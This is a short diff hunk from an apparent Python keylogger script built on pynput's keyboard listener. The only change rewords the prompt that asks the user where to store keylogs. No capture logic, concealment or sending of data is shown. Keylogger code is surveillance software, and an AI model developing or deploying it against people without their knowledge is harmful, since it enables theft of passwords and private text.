@@ -4,7 +4,7 @@ import pynput
 from pynput.keyboard import Key, Listener
 
 #Poll user where to store keylogs
-print('Input file location for storing keylogs')
+print('Please input file location for storing keylogs')
 print('Example: C:/Users/USERNAME/Desktop')
 filepath = input()
 #Ensure filepath exists
